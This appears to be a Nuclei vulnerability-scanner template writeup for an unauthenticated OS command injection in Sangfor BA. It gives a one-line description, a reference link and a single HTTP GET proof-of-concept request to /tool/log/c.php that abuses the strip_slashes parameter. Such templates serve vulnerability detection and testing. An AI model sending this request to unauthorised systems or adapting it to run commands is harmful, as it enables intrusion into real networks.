# Nuclei Template: Sangfor BA - Remote Code Execution
**Template ID:** sangfor-ba-rce
**Vulnerability Class:** OS Command Injection
**Severity:** Critical
**CWE:** CWE-78
**Source:** Nuclei Template (`sangfor-ba-rce.yaml`)

## Vulnerability Information & PoC

## Description
Sangfor products allow remote unauthenticated users to cause the product to execute arbitrary commands.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/tool/log/c.php?strip_slashes=md5&host={{randstr}}
```

## References
- https://mobile.twitter.com/sec715/status/1406886851072253953
